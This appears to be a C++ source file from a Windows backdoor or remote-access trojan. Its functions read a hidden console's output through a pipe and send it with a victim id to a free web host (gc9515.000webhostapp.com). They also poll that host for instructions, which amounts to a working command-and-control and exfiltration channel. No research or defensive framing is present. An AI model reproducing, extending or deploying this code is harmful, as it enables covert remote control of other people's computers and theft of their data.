#include "addition.h"


void sendConsoleOutput(SOCKET *sock, char * output, char *id)
{
    // printf("sendConsoleOutput\n");

    char *request = nullptr;
    request = mySTL::addStr(request, "POST / HTTP/1.1\r\n"
                                     "Host: gc9515.000webhostapp.com\r\n"
                                     "Connection: close\r\n"
                                     "Content-Type: application/x-www-form-urlencoded\r\n"
                                     "Content-Length: ");
    request = mySTL::addStr( request, mySTL::itoa( mySTL::strlen(output)+11 ) );
    request = mySTL::addStr(request, "\r\n"
                                     "\r\n"
                                     "id=");
    request = mySTL::addStr(request, id);
    request = mySTL::addStr(request, "&output=");
    request = mySTL::addStr(request, output);
    request = mySTL::addStr(request, "\r\n");
    send(*sock, request, mySTL::strlen(request), 0);
    printf("%s\n", output);
}

char *readConsoleOutput(HANDLE hReadPipe)
{
    char *output = nullptr;
    char pieceOutput[SIZE_PIECE_OUTPUT];
    int i = 0, count = SIZE_PIECE_OUTPUT;
    DWORD NumberRead;
    DWORD t;
    PeekNamedPipe(hReadPipe, nullptr, NULL, nullptr, &NumberRead, nullptr);
    if ( NumberRead > 0 )
    {
        do
        {
            ZeroMemory(pieceOutput, SIZE_PIECE_OUTPUT);
            while ( NumberRead-i < count )
            {
                count /= 2;
            }
            ReadFile(hReadPipe, pieceOutput, (DWORD)count, &t, nullptr);
            //printf("%s", pieceOutput);
            output = mySTL::addStr(output, pieceOutput);
            i+=count;
        }while ( i < NumberRead );

    }
    return  output;
}


void sendRequest(SOCKET *sock, char *id)
{
    char *request = nullptr;
    request = mySTL::addStr(request, "GET /?id=");
    request = mySTL::addStr(request, id);
    request = mySTL::addStr(request, " HTTP/1.1\r\n"
                                     "Host: gc9515.000webhostapp.com\r\n"
                                     "\r\n"
                            );
    send(*sock, request, mySTL::strlen(request), 0);
}

